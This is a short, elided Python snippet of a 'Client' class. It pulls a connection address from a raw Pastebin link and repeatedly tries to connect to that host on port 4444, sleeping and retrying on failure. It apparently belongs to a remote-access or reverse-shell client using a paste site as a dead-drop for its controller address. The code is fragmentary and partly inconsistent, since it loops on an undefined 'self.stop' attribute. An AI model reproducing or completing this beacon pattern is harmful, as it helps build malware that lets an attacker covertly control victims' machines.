...
class Client():
	run=False
	IP = str(requests.get("https://pastebin.com/raw/K36FCxFt").text)
	def __init__(self,IP, connect:Tuple[str,int]=(IP,4444)) -> None:
		...
		while not self.stop:
			try:
				...
				print(f"Error connecting {connect}| Sleep 1 seconds")
				sleep(1)
